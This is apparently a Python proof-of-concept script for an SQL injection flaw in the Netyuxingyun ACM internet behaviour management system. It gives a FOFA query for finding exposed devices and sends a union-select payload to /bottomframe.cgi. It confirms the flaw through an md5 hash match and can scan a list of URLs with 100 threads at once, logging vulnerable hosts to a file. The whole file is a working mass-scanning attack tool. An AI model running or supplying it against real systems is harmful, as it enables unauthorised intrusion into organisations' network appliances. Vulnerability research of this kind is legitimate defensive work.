# 网御ACM上网行为管理系统存在SQL注入漏洞
# fofa:app=“网御星云-上网行为管理系统”

import requests, sys, argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()  

def banner():
    test = """                              _                      
            _    ____ __  __ 
    / \  / ___|  \/  |
   / _ \| |   | |\/| |
  / ___ \ |___| |  | |
 /_/   \_\____|_|  |_|
                                                            
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="网御ACM上网行为管理系统存在SQL注入漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input your link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please input your file path')
    args = parser.parse_args() 
    if args.url and not args.file:
        poc(args.url)  
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)  
        mp.map(poc, url_list)  
        mp.close()  
        mp.join()  
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = "/bottomframe.cgi?user_name=%27))%20union%20select%20md5(123)%23"
    url = target + payload_url
    headers = {
        'User-Agent':'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
        'Accept':'*/*',
        'Connection':'Keep-Alive'
    }
    try:
        res = requests.get(url=url,headers=headers,timeout=5,verify=False).text
        if '202cb962ac59075b964b07152d234b70' in res:
            print(f'[+]该url:{target}存在SQL注入漏洞')
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(f'[+]该url:{target}存在SQL注入漏洞'+'\n')
        else:
            print(f'[-]该url:{target}不存在SQL注入漏洞')
    except:
        print(f'[-]该url:{target}存在访问问题，请手动测试')
    

if __name__ == '__main__':
    main()